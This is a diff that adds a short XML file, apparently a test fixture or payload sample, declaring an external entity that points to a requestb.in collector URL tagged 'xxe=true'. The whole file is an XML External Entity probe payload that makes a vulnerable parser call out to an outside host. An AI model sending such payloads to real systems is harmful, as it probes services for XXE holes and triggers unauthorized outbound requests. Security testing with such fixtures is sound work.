@@ -1,0 +1,6 @@
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY sp SYSTEM "https://requestb.in/1h9dr631?xxe=true">
+]>
+<r>&sp;</r>
